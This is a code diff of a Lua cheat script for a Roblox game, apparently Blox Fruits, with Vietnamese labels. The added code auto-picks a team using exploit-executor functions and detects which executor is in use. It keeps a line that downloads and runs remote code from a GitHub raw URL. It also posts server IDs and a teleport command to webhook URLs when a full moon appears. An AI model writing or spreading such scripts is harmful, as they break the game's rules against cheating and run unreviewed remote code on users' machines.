@@ -1,3 +1,45 @@
+
+ repeat wait() until game.Players
+    repeat wait() until game.Players.LocalPlayer
+    repeat wait() until game.ReplicatedStorage
+    repeat wait() until game.ReplicatedStorage:FindFirstChild("Remotes");
+    repeat wait() until game.Players.LocalPlayer:FindFirstChild("PlayerGui");
+    repeat wait() until game.Players.LocalPlayer.PlayerGui:FindFirstChild("Main");
+    repeat wait() until game:GetService("Players")
+    repeat wait() until game:GetService("Players").LocalPlayer.Character:FindFirstChild("Energy")
+    
+    wait(1)
+    
+    if not game:IsLoaded() then repeat game.Loaded:Wait() until game:IsLoaded() end
+    
+    if game:GetService("Players").LocalPlayer.PlayerGui.Main:FindFirstChild("ChooseTeam") then
+        repeat wait()
+            if game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("Main").ChooseTeam.Visible == true then
+                if _G.Team == "Pirate" then
+                    for i, v in pairs(getconnections(game:GetService("Players").LocalPlayer.PlayerGui.Main.ChooseTeam.Container.Pirates.Frame.ViewportFrame.TextButton.Activated)) do                                                                                                
+                        v.Function()
+                    end
+                elseif _G.Team == "Marine" then
+                    for i, v in pairs(getconnections(game:GetService("Players").LocalPlayer.PlayerGui.Main.ChooseTeam.Container.Marines.Frame.ViewportFrame.TextButton.Activated)) do                                                                                                
+                        v.Function()
+                    end
+                else
+                    for i, v in pairs(getconnections(game:GetService("Players").LocalPlayer.PlayerGui.Main.ChooseTeam.Container.Pirates.Frame.ViewportFrame.TextButton.Activated)) do                                                                                                
+                        v.Function()
+                    end
+                end
+            end
+        until game.Players.LocalPlayer.Team ~= nil and game:IsLoaded()
+    end
+
+
+
+
+
+
+
+
+
 loadstring(game:HttpGet('https://raw.githubusercontent.com/Chetdithglon/lklklkl/main/wedhook'))()
 
            if game:GetService("Workspace").Map:FindFirstChild("MysticIsland") then
@@ -32,7 +74,49 @@ local ExecutorUsing = is_sirhurt_closure and "Sirhurt" or pebc_execute and "Prot
                     local Final1 = {Url = _G.daobian , Body = Encoded, Method = "POST", Headers = Headers}
 
                     Request(Final1)
-                    end
+           end
+                
+                
+                
+               if World3 then
+                if game:GetService("Lighting").Sky.MoonTextureId=="http://www.roblox.com/asset/?id=9709149431" then
+local ExecutorUsing = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or SONA_LOADED and "Sona" or "Shit exploit g"
+                    local HttpService = game:GetService("HttpService")
+                    local Data =
+                        {
+                            ["embeds"]= {
+                               {
+
+                                    ["fields"]= {
+
+                                        {
+                                            ["name"]= "Full Moon",
+                                            ["value"]= "```Người dùng đã thấy Full Moon```",
+                                            ["inline"]= true
+                                        },
+                                        {
+                                            ["name"]= "lệnh teleport sever",
+                                            ["value"]= 'game:GetService("TeleportService"):TeleportToPlaceInstance('..game.PlaceId..', "'..game.JobId..'", game.Players.LocalPlayer)',
+                                            ["inline"]= true
+                                        },
+                                    }              
+                                }
+                            }
+                            }
+
+                    local Headers = {["Content-Type"]="application/json"}
+                    local Encoded = HttpService:JSONEncode(Data)
+
+                    Request = http_request or request or HttpPost or syn.request
+                    local Final1 = {Url = _G.FullMoon , Body = Encoded, Method = "POST", Headers = Headers}
+
+                    Request(Final1)
+                end
+                end
+                
+                
+                
+                
 
 
 function two(gotoCFrame) --- Tween
@@ -9357,9 +9441,9 @@ spawn(function()
 		end
 	end
 end)
-
+if World3 then
    Race:Seperator("Full Mon Và Đảo Bí Ẩn")
-local FullMoon = Race:Label("1")
+local FullMoon = Race:Label("")
 
 spawn(function()
     while task.wait() do
@@ -9383,7 +9467,7 @@ end)
 
 
 
-local mr = Race:Label("1")
+local mr = Race:Label("")
 
 task.spawn(function()
 	while task.wait() do
@@ -9397,7 +9481,7 @@ task.spawn(function()
 	end
 end) 
 
-
+end
 
 if World1 or World2 then
     Race:Label("Qua Sea 3 Mới Bật Được Dcm")
